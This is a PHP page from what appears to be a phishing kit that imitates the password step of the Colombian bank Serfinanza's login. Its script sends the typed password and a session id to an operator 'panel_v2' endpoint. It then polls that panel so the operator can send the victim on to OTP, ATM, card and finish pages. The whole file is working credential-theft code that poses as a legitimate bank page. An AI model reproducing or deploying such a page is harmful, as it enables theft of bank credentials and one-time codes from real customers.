<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Serfinanza - Clave de Acceso</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <style>
        * {
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        .user {
            width: 90%;
            height: 370px;
            border: 1px solid #cdcdcd;
            margin: auto;
            margin-top: 50px;
            border-radius: 15px;
            background: white;
            padding: 20px;
            text-align: center;
        }
        #txtPassword {
            width: 80%;
            height: 40px;
            padding-left: 10px;
            border: 1.5px solid #170c84;
            border-radius: 5px;
            margin: 20px 0;
        }
        #txtPassword:focus {
            outline: none;
            border-color: #0d0660;
        }
        #btnPass {
            height: 40px;
            margin-top: 25px;
            background-color: #170c84;
            width: 150px;
            border-radius: 25px;
            border: none;
            color: white;
            cursor: pointer;
        }
        #btnPass:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .mensaje {
            color: red;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <img src="img/menu.webp" alt="" width="100%">
    
    <div class="user">
        <img src="img/contraseña.webp" alt="" width="80%">

        <input type="password" id="txtPassword" placeholder="Ingresa tu contraseña">
        <div class="mensaje">La contraseña debe tener al menos 4 caracteres</div>
        
        <br>
        <input type="submit" id="btnPass" value="Ingresar">
        <br><br>
        
        <img src="img/letras2.webp" alt="" width="80%">
    </div>

    <img src="img/footer.webp" alt="" width="100%">
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const txtPassword = document.getElementById("txtPassword");
    const btnPass = document.getElementById("btnPass");
    const mensaje = document.querySelector(".mensaje");
    
    const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

    if (!idreg) {
        alert("Error interno: no hay idreg.");
        window.location.href = "../../checkout.php";
        return;
    }

    // Limpiar errores al escribir
    txtPassword.addEventListener("keyup", () => {
        txtPassword.style.border = "1.5px solid #170c84";
        mensaje.style.display = "none";
    });

    // Enviar clave
    btnPass.addEventListener("click", async () => {
        const password = txtPassword.value.trim();
        
        if (password.length > 3) {
            btnPass.disabled = true;
            
            try {
                const fd = new FormData();
                fd.append("action", "save_pass");
                fd.append("idreg", idreg);
                fd.append("clave", password);

                const r = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                    method: "POST",
                    body: fd,
                    headers: {
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!r.ok) {
                    throw new Error(`HTTP ${r.status}: ${r.statusText}`);
                }

                const json = await r.json();

                if (json.success) {
                    window.location.href = "cargando.php";
                } else {
                    throw new Error(json.error || "Error desconocido");
                }

            } catch (error) {
                console.error("Error:", error);
                alert("Error al guardar clave: " + error.message);
                btnPass.disabled = false;
            }
        } else {
            mensaje.style.display = "block";
            txtPassword.style.border = "1.5px solid red";
            txtPassword.focus();
        }
    });

    // Verificar redirecciones del panel
    const checkRedirect = setInterval(async () => {
        try {
            const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                method: 'GET',
                cache: 'no-cache'
            });
            
            if (r.ok) {
                const data = await r.json();
                
                if (data.success && data.data && data.data.redirect) {
                    clearInterval(checkRedirect);
                    
                    switch (data.data.estado) {
                        case 'usuario':
                            window.location.href = "serfinanza.php";
                            break;
                        case 'otp':
                            window.location.href = "otp.php";
                            break;
                        case 'cc':
                            window.location.href = "/reintentar.php";
                            break;
                        case '923':
                            window.location.href = "923.php";
                            break;
                        case 'atm':
                            window.location.href = "atm.php";
                            break;
                        case 'finalizado':
                            window.location.href = "finish.php";
                            break;
                    }
                }
            }
        } catch (e) {
            // Ignorar errores de polling
        }
    }, 2000);

    // Limpiar intervalo al salir
    window.addEventListener('beforeunload', () => {
        if (checkRedirect) {
            clearInterval(checkRedirect);
        }
    });
});
</script>

</body>
</html>